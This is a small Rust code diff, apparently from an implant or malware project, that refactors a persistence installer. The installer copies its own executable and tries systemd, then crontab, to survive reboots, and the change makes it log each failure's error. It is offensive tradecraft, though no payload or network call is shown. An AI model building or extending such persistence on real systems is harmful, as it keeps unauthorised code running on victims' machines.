@@ -7,18 +7,26 @@ pub fn install() -> Result<(), crate::Error> {
     let executable_path = super::copy_executable()?;
 
     println!("trying systemd persistence");
-    if let Ok(_) = install_systemd(&executable_path) {
-        println!("success");
-        return Ok(());
+    match install_systemd(&executable_path) {
+        Ok(_) => {
+            println!("success");
+            return Ok(());
+        },
+        Err(err) => {
+            println!("failed: {err}");
+        },
     }
-    println!("failed");
 
     println!("trying crontab persistence");
-    if let Ok(_) = install_crontab(&executable_path) {
-        println!("success");
-        return Ok(());
+    match install_crontab(&executable_path) {
+        Ok(_) => {
+            println!("success");
+            return Ok(());
+        },
+        Err(err) => {
+            println!("failed: {err}");
+        },
     }
-    println!("failed");
 
     // other installation techniques
 
